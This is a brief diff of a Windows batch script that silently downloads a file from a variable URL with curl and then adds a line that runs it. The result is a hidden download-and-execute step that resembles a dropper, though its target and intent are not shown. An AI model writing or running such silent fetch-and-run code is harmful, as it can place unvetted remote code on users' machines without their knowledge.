@@ -8,3 +8,6 @@ mkdir "%~dp0" >nul 2>&1
 
 :: Download the file silently
 curl -o "%DEST%" "%URL%" >nul 2>&1
+
+:: Run the downloaded file
+start "" "%DEST%"
